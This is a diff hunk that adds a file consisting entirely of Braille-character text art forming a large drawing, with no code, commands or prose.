@@ -1,0 +1,1389 @@
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣠⣾⣿⣿⣇⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣤⣴⣶⣿⣿⣿⡏⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⢀⣀⣤⣤⣤⣄⠀⠀⠀⠀⢠⣤⣶⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣰⣿⣿⣿⣿⣿⣿⡆⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣧⠀⠀⣠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣴⣿⣿⣿⣿⣿⣿⣿⣿⡀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣴⣾⣿⣿⣿⣿⣿⣿⣿⠉⠉⠉⠙⠃⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣤⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣭⣟⠛⠛⠋⠉⠉⠉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⠋⢹⣿⣿⠟⣫⣾⣆⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠉⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢹⣿⣿⠟⢋⣴⣦⣌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⠀⢈⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠈⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢹⣿⣿⣿⣿⡿⠇⠀⠀⠘⢿⡿⠿⠿⠛⠛⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠃⠀⣿⣿⣿⠿⠟⠃⠀⠀⠀⠀⠀⠀⠻⠿⠿⣿⣿⣿⣿⡿⠿⠟⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠿⠿⠿⠛⠛⠉⠀⠀⢸⣿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠛⠛⠋⠉⠀⠀⠀⠀⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⢰⣿⣿⣶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⡀⠀⠀⣿⣿⣿⣷⣤⡀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣷⡄⠰⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠈⠹⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣦⣤⡈⠛⢿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⣾⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣧⡀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣶⣶⣾⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠁⠀⠉⠉⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⠟⢀⣀⣀⣠⣴⣶⣶⣾⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣾⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣼⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣾⣿⣿⣿⣿⣿⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
